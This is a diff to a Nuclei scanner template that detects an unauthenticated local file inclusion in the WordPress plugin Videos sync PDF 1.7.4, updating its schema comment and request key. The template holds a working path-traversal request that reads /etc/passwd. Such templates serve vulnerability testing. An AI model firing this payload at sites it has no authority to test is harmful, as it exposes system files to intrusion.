@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: video-synchro-pdf-lfi
 info:
   name: Videos sync PDF 1.7.4 - Unauthenticated Local File Inclusion
@@ -7,7 +8,7 @@ info:
     - https://www.exploit-db.com/exploits/50844
     - https://wordpress.org/plugins/video-synchro-pdf/
   tags: wordpress,wp-plugin,lfi,wp
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=../../../../../../../../../etc/passwd%00'
